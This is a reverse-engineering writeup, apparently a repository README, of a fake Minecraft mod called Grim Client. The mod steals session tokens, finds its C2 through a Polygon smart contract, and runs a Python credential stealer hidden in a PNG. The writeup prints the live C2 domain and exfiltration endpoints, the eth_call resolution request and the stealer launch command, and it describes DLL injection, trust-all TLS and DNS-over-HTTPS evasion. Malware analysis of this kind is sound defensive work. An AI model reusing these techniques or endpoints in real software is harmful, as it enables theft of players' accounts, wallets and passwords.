# Grim Client 1.0 — a Minecraft mod that steals your session and hides its C2 on Polygon

Also tracked under the name **SilentNet** - that label comes from outside the sample; nothing inside it
says so. Everything below is what the bytes themselves show.

> **Disclaimer.** This is a reverse-engineering writeup of malware I analysed for documentation and
> defence purposes. It describes what the sample does; it is not affiliated with, endorsed by, or
> intended to help anyone operate it. Nothing here should be used maliciously. Payload files are
> included only as evidence — treat them as hostile artifacts, handle in an isolated environment.

**Spot it in the wild:** an unsigned Minecraft mod jar that makes `eth_call` requests to Polygon RPC
providers, then downloads a PNG whose size doesn't match its declared dimensions, then creates
`%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex` containing `python.exe`, `AppHost\main.py` and
`_stealer.log`. Full indicator list: [IOCS.md](IOCS.md).

`Grim_Client_1.0.jar` presents itself as a Fabric/Forge/LabyMod client mod ("Full Bright" by
`L3nnart_`). It is two pieces of malware in one jar:

1. **A Minecraft session stealer** in Java (`net.fabric.*`, obfuscated with char arithmetic). It grabs
   username / UUID / **access token**, resolves its C2 from an **EVM smart contract on Polygon**,
   uploads the session, downloads a Python stealer hidden inside a **PNG file**, and exfiltrates the
   Minecraft game log.
2. **A second component wrapped in a Java protector that calls itself DoomsDay** (`net.java.*`):
   custom class loader, XOR-keyed resources, a hand-written range coder, native libraries loaded with
   `System.load()`, and a 2.28 MB encrypted blob handed to a native function.

**TL;DR**

* Four ways to get it running: Fabric mod (`fabric.mod.json`, id `dd`), Forge mod (`mods.toml`,
  `mcmod.info`), LabyMod addon ("Full Bright" by `L3nnart_`), and an executable jar
  (`Main-Class: net.fabric.reo_qrox_ebgg_jhss`).
* Session theft via reflection, trying Yarn / Mojmap / SRG names until one works.
* **The C2 domain is not in the binary.** It comes from a smart contract on Polygon mainnet through a
  plain `eth_call` (`0xce6d41de` → ABI string). Contract: `0x9c0a507300fd902787bb193d80fca5ce6e1bff9a`.
* The domain it returns today is `thisisafalsepositive.st` — also the hardcoded fallback. That domain
  is **live** and serves the payload, so the name is cover, not a sinkhole. One transaction can repoint
  it without rebuilding the jar.
* Second stage: `GET https://<c2>/cdn/v2/9f4e7a2c1b8d.png` — a real 720×720 PNG whose extra chunk
  `hIds` holds a zlib stream → ZIP (767 entries) containing a **complete portable Python 3.12** with
  pycryptodome, Pillow, requests, psutil, `vdf` (Steam files) and pywin32, plus `AppHost/main.py` and
  `AppHost/app.pyd`.
* The Java side then runs `<workdir>\python.exe AppHost\main.py -u <userId> --mcInfo <b64 session>`
  from `%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex`. The credential harvesting itself is done by
  Python code fetched from the C2.
* `app.pyd` is **Nuitka-compiled**, and its 237 KB `RT_RCDATA` resource holds the whole program's
  constants behind an S-box substitution that looks like crypto but isn't. Cracked: it is a full stealer —
  browser passwords/cookies/cards/tokens, Discord, Telegram, Steam, Roblox, Minecraft launcher accounts,
  ten wallet types, screenshots, git/SSH/thunderbird file grabs. Details in
  [`stage2/CRACKED.md`](stage2/CRACKED.md).
* Campaign/build id: `fc4a86d2-38e2-4f28-980c-22860f4037cb`. Endpoints: `POST /shard/prefireMc`,
  `POST /shard/submitMinecraftLog`.

---

## Reading the code

The jar is an ordinary zip, so vineflower gets class files out; the interesting work is undoing two
different obfuscators.

**Layer 1 — char arithmetic (`net.fabric.*`).** Almost no string literal exists in the code; each one
is assembled at runtime:

```java
var0[4] = (char)(180 - 126);              // '6'
var0[7] = (char)('쵖' - '촢');             // '1'
StringBuilder var3 = new StringBuilder();
var3.append((char)(5389 + '\ueb23'));     // '0'
...
return new String(var0);                 // "0xce6d41de"
```

plus opaque-predicate junk (`int v = -207066414; if (v == -207066414) { …dead arithmetic… }`) and
meaningless local names. `tools/deobfuscate.py` folds it back: constant-fold the char casts, drop the
dead predicate blocks, then fold every fully-constant `StringBuilder`/`char[]` builder into a literal.
`btcValue` 3019 → 984 lines, `znIHc` 1323 → 548, `tmpSikxuafu` 989 → 574, `hkonjkz` 531 → 224.

A bug worth recording: an early version leaked a builder's value across method boundaries and turned
the contract selector `0xce6d41de` into the contract address. Fixed by resetting a name at every typed
declaration (`RESET_RE`). Exactly the kind of thing that quietly produces a wrong IOC.

**Layer 2 — DoomsDay (`net.java.*`).** Not obfuscated Minecraft code but the protector's runtime stub:
custom `ClassLoader`, XOR-keyed resources, arithmetic coder, JNA plumbing, native entry point. Notes in
[`protector/DoomsDay.md`](protector/DoomsDay.md).

Everything here came from reading bytes — decompilers, `javap`, hex, and read-only lookups against
public Polygon RPCs and Cloudflare DNS (`tools/c2_recon.py`).

---

## The disguises

| File | What it claims |
|---|---|
| `META-INF/MANIFEST.MF` | `Main-Class: net.fabric.reo_qrox_ebgg_jhss` → runs with `java -jar` |
| `fabric.mod.json` | id `dd`, entrypoints `["net.java.h", "net.fabric.hkonjkz"]` |
| `META-INF/mods.toml`, `mcmod.info`, `pack.mcmeta` | Forge mod metadata (id `dd`) |
| `addon3.json`, `addon4.json` | LabyMod addon **"Full Bright" by `L3nnart_`** |

The two addon manifests are copied verbatim from the legitimate open-source LabyMod addon "Full
Bright" by Lennart Löschel — real UUIDs, real icon URL — with only `mainClass` swapped to the malware's
bootstrap. An innocent third party is being impersonated, and blocklisting that name or those UUIDs
would hit the genuine addon too.

The manifest also leaks the build environment: Fabric Loom 1.18.2, Gradle 9.7.1, Minecraft 1.21,
intermediary mappings. This was built with a real mod toolchain, then wrapped and obfuscated.

Entry points:

```
net.fabric.reo_qrox_ebgg_jhss.main   (java -jar)  -> re-executes itself detached, env "DoubleClick"
net.fabric.hkonjkz.onInitialize      (Fabric)     -> session theft, env "Fabric"
net.java.h / i / mod_d               (Forge etc.) -> DoomsDay bootstrap, op 5/6 on "/64FV7OQUIMC8I"
net.java.r / s                       (LabyMod)    -> DoomsDay bootstrap
```

---

## Stage 1: the session stealer (`net.fabric.*`)

Deobfuscated sources: [`stage1/deobfuscated/`](stage1/deobfuscated/). Renamed, readable version of the
same logic: [`stage1/GrimClientStealer_readable.java`](stage1/GrimClientStealer_readable.java).

**`hkonjkz` (Fabric `ModInitializer`).** A thread waits for the client to initialise, then pulls the
session out of the running game by reflection, trying every naming scheme:

```java
class_310 | net.minecraft.client.Minecraft | MinecraftClient
getInstance | method_1551 | instance | field_1700
getUsername | getName | method_1676 | username | name | field_1982
getUuidOrNull | getProfileId | getUuid | method_44717 | uuid | field_1985
getAccessToken | method_1674 | accessToken | field_1983
```

It builds `{"username":…,"uuid":…,"accessToken":…}`, base64-encodes it (`mcInfo`), and re-launches the
same jar detached in a hidden directory:

```
javaw.exe -cp <this jar> net.fabric.btcValue <base64 context>
   context = {mcInfo, prefireId, userId, tag, domain, gameDir, mcUsername, mcUuid, env}
   cwd     = %LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex
   stdout  -> _spawn.log (appended)
```

`gameDir` is found by probing `options.txt`, `config`, `mods` in the working directory, then falling
back to `%APPDATA%\.minecraft`.

**`btcValue` (the dropper).** Detached process, logs its own progress into `_spawn.log`:

1. **Resolve C2** — `getDomain()`, see next section; result cached.
2. **Register the victim** — `POST https://<c2>/shard/prefireMc` with
   `{"sessionId":"fc4a86d2-38e2-4f28-980c-22860f4037cb","userId":"<id>"}` and headers
   `X-Edge-Cache-Revalidate: stale-if-error`, `X-Runtime-Env: jre-embedded`. The reply's `"result"`
   becomes `prefireId`.
3. **Download the runtime** — `GET https://<c2>/cdn/v2/9f4e7a2c1b8d.png` with a Chrome 131 UA and
   `Sec-Fetch-*` headers, 3 attempts with backoff. Skipped if `python.exe` + `AppHost\main.py` already
   exist ("Portable runtime already cached").
4. **Extract the PNG** — walk the chunk list, find the chunk typed `hIds` (104, 73, 100, 115), raw-inflate
   its data, treat the result as a ZIP and unpack into the workdir. Entry names are used unsanitised in
   `workdir.resolve(entryName)`, so the archive can also write outside that directory.
5. **Spawn the stealer** — `<workdir>\python.exe AppHost\main.py -u <userId> [--env …] [--tag …]
   [--mcInfo <b64 session>] [--prefireId <id>]` with cwd `AppHost`, output appended to `_stealer.log`.
6. **Exfiltrate the game log** — reads `%APPDATA%\.minecraft\logs\latest.log` (up to 5 MB, cut to 2.5 MB
   from each end with `\n=== TRUNCATED ===\n` between), appends its own log plus `jvm=`/`os=`/`user=`,
   then `POST https://<c2>/shard/submitMinecraftLog` with `{"userId","content",
   "filename":"combined.log","mcUsername","mcUuid","executionEnvironment":"<env>-Detached"}`.

**`tmpSikxuafu` (HTTP client).** Not `HttpURLConnection` — a hand-rolled HTTP/1.1 client over a raw
`SSLSocket` with SNI, plus two things that matter:

* **Trust-all TLS.** A `X509TrustManager` accepting anything, installed in a static initialiser via
  `SSLContext.init(null, {new bufTxjwh()}, null)`. Any certificate, including a MITM one, is accepted.
* **DNS-over-HTTPS resolution.** Names are resolved by sending a raw DNS query to `1.1.1.1:443`
  (`GET /dns-query?dns=<base64url>`, `Host: cloudflare-dns.com`) with a 5 minute cache. The C2 lookup
  never touches the OS resolver, so it does not show up in the system DNS cache or resolver logs — only
  as HTTPS traffic to Cloudflare.

---

## The on-chain C2

`getDomain()` builds this JSON-RPC body and posts it to each endpoint until one answers:

```json
{"jsonrpc":"2.0","method":"eth_call",
 "params":[{"to":"0x9c0a507300fd902787bb193d80fca5ce6e1bff9a","data":"0xce6d41de"},"latest"],"id":1}
```

Endpoints, all public providers: `polygon.drpc.org`, `polygon-bor-rpc.publicnode.com`, `1rpc.io/matic`,
`api.zan.top/polygon-mainnet`, `rpc-mainnet.matic.quiknode.pro`. The hex reply is ABI-decoded (strip
`0x`, skip the 32-byte offset word, read the length word, take that many bytes as ASCII) into the domain.
If every RPC fails it falls back to the hardcoded `thisisafalsepositive.st`.

Replaying that call on 2026-11-21 (four of five RPCs reachable):

```
0x…0020 0000…0017 "thisisafalsepositive.st"
```

The contract holds the same string as the fallback, and that domain resolves through Cloudflare
(`185.178.208.191`, NS `dean`/`luciane.ns.cloudflare.com`) — and actually serves the payload. So the
campaign is active; "thisisafalsepositive" is a cover name.

Same design idea as FunRat's TON contract, moved to an EVM chain where the RPC endpoints are already
hardcoded: no host in the binary, C2 changes with one transaction, and the lookups look like ordinary
wallet traffic. Detection has to be behavioural — an unsigned mod jar making `eth_call` requests, a PNG
download whose size doesn't match its declared dimensions, then `python.exe` appearing under
`%LOCALAPPDATA%\Microsoft\Windows\NtProfileIndex`.

---

## Stage 2: the Python stealer (fetched from the live C2)

Details and hashes: [`stage2/STAGE2.md`](stage2/STAGE2.md).

The payload path returns a genuine 720×720 PNG of 16,956,757 bytes with one extra chunk after the image
data: `hIds`, 16,539,137 bytes. Inflating it gives a ZIP of 767 entries — a **complete portable Python
3.12** (`python.exe`, `python312.dll`, `python312.zip`) plus **pywin32**, `_sqlite3`/`sqlite3.dll`,
`_ssl`/`libssl`/`libcrypto`, `_ctypes`, `_wmi`, and two files that matter:

```
AppHost/main.py    353 bytes   -> loads app.pyd by path and calls app.run()
AppHost/app.pyd    1.85 MB     -> the stealer, compiled with Nuitka (export: PyInit_app)
```

`app.pyd` imports only `python312.dll`, the CRT and a handful of kernel32 functions — resolved **by
ordinal**, which is why they never appear as normal imports — and its `.rsrc` holds exactly one resource:

```
RT_RCDATA #3   237,461 bytes   entropy 7.984
header: <4-byte checksum> <LE length> <16 bytes> <237,437 bytes "ciphertext">
```

That blob is not really encrypted. The loader runs one loop over it (`0x18016da80`):

```python
bl = 0
for i in range(8, len(res)):
    val  = SBOX[((i - 8 + bl) & 0xff) ^ res[i]]     # SBOX: 256-byte permutation in .rdata
    if i >= 0x18: out[i - 16] = val
    bl = val                                        # the output byte is next round's key
    op, k = CONSTS[i & 7]                           # jump table: add21 add85 sub94 add21 add39 sub113 add6 sub96
    bl = (bl + k) & 0xff if op == 'add' else (bl - k) & 0xff
```

No AES, no ChaCha, no key beyond the two tables in `.rdata`. Decrypting gives Nuitka's `.bytecode`
constants store — every string, identifier, docstring and source path of the compiled stealer. Tool:
[`tools/app_pyd_decrypt.py`](tools/app_pyd_decrypt.py); full writeup:
[`stage2/CRACKED.md`](stage2/CRACKED.md); extracted strings:
[`stage2/app_constants.strings.txt`](stage2/app_constants.strings.txt).

The module tree it reveals:

```
main.py, st.py
app/            config contract crypto http logging resources staging trace
app/handlers/   browser browser_extensions credentials discord files firefox
                keywords minecraft screenshot system_info wallets
app/util/       crypto dll_injection file handle_copy pipe process registry
```

And what it does, straight from its own docstrings and strings: SQLite reads of `logins`, `cookies`,
`token_service` and `autofill` across Chrome/Edge/Brave/Opera/Opera GX/Firefox; the Chrome ABE key pulled
by **injecting a DLL into the browser process** (`VirtualAllocEx` + `CreateRemoteThread` + `LoadLibraryA`)
and read back over a named pipe whose name is derived from the PID "same algorithm as Java"; Discord token
collection plus injection; Telegram `tdata` zipped; Roblox cookies to Netscape format; Steam `loginusers.vdf`
/ `local.vdf` tokens; Minecraft launcher accounts (Lunar, Prism, Feather, Modrinth, Microsoft); wallets for
MetaMask, Exodus, Atomic, Electrum, Electrum-LTC, Zcash, Monero, TON and Tron; screenshots as base64 JPEG;
keyword-driven file grabs (`Git_Credentials.txt`, `SSH_Keys.zip`, `Thunderbird_Profiles.zip`,
`Mullvad_Account.txt`); WMI system inventory; DPAPI and Fernet handling; a local status server on
`127.0.0.1` used to detect an already-running instance; and a self-bootstrap that downloads
Python 3.12.7 embeddable plus `get-pip.py` if the runtime is missing.

It also re-resolves the C2 from the **same Polygon contract** as the Java stage, with its own campaign UUID
(`4015d0e9-4cab-4ac1-8dfd-5ee8f283bca1`) and extra RPC endpoints — two of them with leaked API tokens. An
`app.staging` thread pulls further components from `/cdn/` and `/cdn/e/`, so what is analysed here is the
shipped part, not necessarily everything.

---

## The DoomsDay-protected component (`net.java.*`)

A separate piece of the jar, independent of the stealer above — the `net.fabric.*` classes are present in
cleartext, so nothing here protects them. What it protects is a native payload.

| Resource | Stored | XOR key | Decoded size | Contents |
|---|---:|---|---:|---|
| `/net/java/a` | 214,419 | `-8461988079585481081` | 653,551 | class map for the custom `ClassLoader` (`n.loadClass("a")` → hidden `main`) |
| `/net/java/b` | 17,474 | `-4062297973245990737` | 85,070 | container of 8 native libraries: `dll_i386`, `dll_x86_64`, `dll_aarch64`, `dylib_x86_64`, `dylib_aarch64`, `so_i386`, `so_x86_64`, `so_aarch64` |
| `/net/java/c` | 398,089 | `-1083759330220665782` | 1,217,577 | container of 3 per-architecture blocks used to patch the blob before native execution |
| `/net/java/d`, `/net/java/e` | 106,215 / 14,152 | not resolved | — | arguments for the hidden main class |
| `/64FV7OQUIMC8I` | 2,278,288 | native | — | encrypted payload handed to `l.n(Object)` |

Bootstrap (`l.a(Object[])`) is one-shot: scan the command line for `--domsdayversion=` and
`--configstorage=` (then zero those markers in memory), look up the payload, load the native library for
this OS/arch from `/net/java/b`, call the native `n(Object)` with an 8-slot control array, then wipe the
payload buffer. Both wipes are aimed at memory scraping.

Native side (`g.b`): pick the right `dll_`/`dylib_`/`so_` entry, write it to
`%TEMP%\<hex>-<hex>.<ext>`, `System.load()` it, and on Windows patch 8 bytes at
`blob.length - 4096 + 48` with a per-arch value from `/net/java/c` — the blob has a fixed 4 KB trailer
holding pointers/hook addresses — before handing it to the native code. JNA strings (`kernel32`, `libc`,
`libdyld.dylib`, `VirtualAlloc/Protect/Free`, `mmap/munmap/mprotect`, `__TEXT`) show the native side
allocates and re-protects memory.

The protector also has its own update channel: a raw `SocketChannel` to port 443 of **`165.22.196.0`** and
**`2a03:d0c0:2:d0::142c:e001`** with a fake TLS preamble `{0x16, 0x03, 0x64, len}` — not a real ClientHello.
Together with `Error load DoomsDay - update not found` and `--domsdayversion=`, that's a licence/update path
separate from the stealer C2.

Cheap packer tells: every `net/java/*` entry and the blobs are zip-stamped **02-01-2016 13:00** while the
payload classes are recent; a package literally named `net/java` with single-letter classes plus resource
entries `a`–`e`; flags `--doomsdayargs=`, `--domsdayversion=`, `--stored=`, `--mainClass`.

---

## Repo layout

```
grim-analysis/
  README.md              this writeup
  SAMPLES.md             sample inventory, hashes, zip listing, timestamps
  IOCS.md                all indicators in one place
  PROBES.md              lookups performed and their raw output
  OSINT.md               infrastructure notes, what is and isn't attributable
  stage1/
    GrimClientStealer_readable.java   renamed reconstruction of the stealer
    deobfuscated/                     deobfuscator output for every net.fabric.* class
  stage2/
    STAGE2.md              what the live C2 serves and how far static analysis gets
    9f4e7a2c1b8d.png       fetched payload carrier (17 MB) - hostile artifact, gitignored
    (no binaries here)     sample + payload by hash; tooling reproduces everything
    extracted/AppHost/     main.py from the hidden ZIP (the rest is stock runtime)
    CRACKED.md             how the app.pyd blob is encrypted and what it contains
    app_constants.strings.txt   readable constants from the decrypted blob
  protector/
    DoomsDay.md          analysis of the DoomsDay layer
    deobfuscated/        decompiled net.java.* stub
  LICENSE                CC BY 4.0 for the writeup and tooling; samples excluded
  ABUSE_REPORTS.md       ready-to-send abuse/notification drafts
  tools/
    deobfuscate.py       char/string-arithmetic deobfuscator
    app_pyd_decrypt.py   decrypt the RT_RCDATA constants blob out of app.pyd
    c2_recon.py          Polygon replay of the C2 resolution (payload fetch is opt-in)
    png_extract.py       PNG "hIds" chunk -> inflate -> ZIP
    doomsday_unpack.py   XOR + container header check for the DoomsDay resources
    doomsday_codec.py    arithmetic/range decoder port
    classdump.py         minimal class-file reader (field tables, resolved bytecode)
  work/                  scratch: extract/, src/ (vineflower), deobf/, doom/
```

---

## Open problems

* **The native payload is not recovered.** `/64FV7OQUIMC8I` is decrypted and executed by the native library
  from `/net/java/b`; getting that library out needs the arithmetic coder ported, and then reversing it is
  its own exercise. The XOR layer on top of the blob is trivial — the real protection is native.
* **The stealer's control flow is still compiled.** The constants blob is decrypted and readable, but Nuitka
  turned the logic into machine code — mapping exactly *when* each handler runs means reversing that C output.
  `app.staging` plus `/cdn/e/` also imply components that were never shipped in this PNG.
* **The 17 MB `assets/mnqmuqdh.cache` is unexplained.** Entropy 7.997, no repeating XOR key at periods ≤ 64,
  no duplicate 16-byte blocks, no zip/class magic, and no reference to that path in any deobfuscated class.
* **The on-chain value is a snapshot** (2026-11-21). Re-run `tools/c2_recon.py` before quoting it.

No public reporting on this sample turned up during the analysis — searches for the mod name, the endpoint
names, the campaign UUID, the contract address and the domain return nothing relevant.

---

## License and contact

The writeup, reconstructions and tooling are **CC BY 4.0** (see [LICENSE](LICENSE)); the malware
artifacts are provided for research and documentation only and are not licensed for reuse. Abuse and
notification drafts are in [ABUSE_REPORTS.md](ABUSE_REPORTS.md). Questions, corrections, or a working
port of the DoomsDay codec: open an issue.
